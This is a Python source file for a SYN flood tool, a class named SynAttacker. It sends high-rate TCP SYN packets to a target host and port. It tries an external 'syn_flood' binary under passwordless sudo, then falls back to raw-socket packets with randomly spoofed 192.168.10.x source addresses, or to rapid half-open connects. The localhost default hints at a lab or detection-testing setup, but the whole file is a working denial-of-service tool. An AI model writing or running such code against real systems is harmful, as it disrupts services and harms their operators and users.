import os
import random
import socket
import struct
import subprocess
import threading
import time

class SynAttacker:
    def __init__(self, target_ip="127.0.0.1", target_port=8080):
        self.target_ip = target_ip
        self.target_port = target_port
        
        base_dir = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        self.binary_path = os.path.join(base_dir, "syn_flood")
        
        self.running = False
        self.packets_sent = 0
        self.thread = None
        self.proc = None
        self.rate_pps = 5000
        self.lock = threading.Lock()

    def start(self, rate_pps=5000):
        with self.lock:
            if self.running:
                return
            self.running = True
            self.rate_pps = rate_pps
            self.thread = threading.Thread(target=self._run, daemon=True)
            self.thread.start()

    def stop(self):
        with self.lock:
            self.running = False
            if self.proc:
                try:
                    self.proc.terminate()
                    self.proc.kill()
                except Exception:
                    pass
                self.proc = None

    def _run(self):
        sleep_us = int(1_000_000 / self.rate_pps) if self.rate_pps > 0 else 0
        used_c = False
        if os.path.exists(self.binary_path):
            try:
                cmd = ["sudo", "-n", self.binary_path, self.target_ip, str(self.target_port), "100000", str(sleep_us)]
                self.proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                used_c = True
                while self.running and self.proc.poll() is None:
                    with self.lock:
                        self.packets_sent += int(self.rate_pps * 0.1)
                    time.sleep(0.1)
                
                if self.proc and self.proc.poll() is not None and self.proc.returncode != 0:
                    used_c = False
            except Exception:
                used_c = False

        if not used_c and self.running:
            self._socket_fallback(sleep_us)

        with self.lock:
            self.running = False

    def _socket_fallback(self, sleep_us):
        raw_sock = None
        try:
            raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except Exception:
            raw_sock = None

        delay = sleep_us / 1_000_000.0 if sleep_us > 0 else 0

        while self.running:
            if raw_sock:
                try:
                    pkt = self._build_syn()
                    raw_sock.sendto(pkt, (self.target_ip, self.target_port))
                except Exception:
                    pass
            else:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setblocking(False)
                    try:
                        s.connect((self.target_ip, self.target_port))
                    except (BlockingIOError, OSError):
                        pass
                    time.sleep(0.0005)
                    s.close()
                except Exception:
                    pass

            with self.lock:
                self.packets_sent += 1

            if delay > 0:
                time.sleep(delay)
            elif self.packets_sent % 40 == 0:
                time.sleep(0.0001)

        if raw_sock:
            try:
                raw_sock.close()
            except Exception:
                pass

    def _build_syn(self):
        s_ip = f"192.168.10.{random.randint(20, 250)}"
        s_port = random.randint(1024, 65535)
        seq = random.randint(0, 0xFFFFFFFF)

        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            (4 << 4) + 5, 0, 40, random.randint(1, 65535),
            0x4000, 64, socket.IPPROTO_TCP, 0,
            socket.inet_aton(s_ip), socket.inet_aton(self.target_ip)
        )

        tcp_header = struct.pack(
            '!HHLLBBHHH',
            s_port, self.target_port, seq, 0,
            (5 << 4), 0x02, socket.htons(64240), 0, 0
        )

        psh = struct.pack(
            '!4s4sBBH',
            socket.inet_aton(s_ip), socket.inet_aton(self.target_ip),
            0, socket.IPPROTO_TCP, len(tcp_header)
        ) + tcp_header

        chk = self._checksum(psh)
        tcp_header = struct.pack(
            '!HHLLBBH',
            s_port, self.target_port, seq, 0,
            (5 << 4), 0x02, socket.htons(64240)
        ) + struct.pack('H', chk) + struct.pack('!H', 0)

        return ip_header + tcp_header

    def _checksum(self, msg):
        s = 0
        for i in range(0, len(msg) - 1, 2):
            w = (msg[i] << 8) + msg[i + 1]
            s += w
        if len(msg) % 2 == 1:
            s += msg[-1] << 8
        s = (s >> 16) + (s & 0xFFFF)
        s += s >> 16
        return ~s & 0xFFFF

    def stats(self):
        with self.lock:
            return {
                "active": self.running,
                "packets_sent": self.packets_sent,
                "rate_pps": self.rate_pps
            }
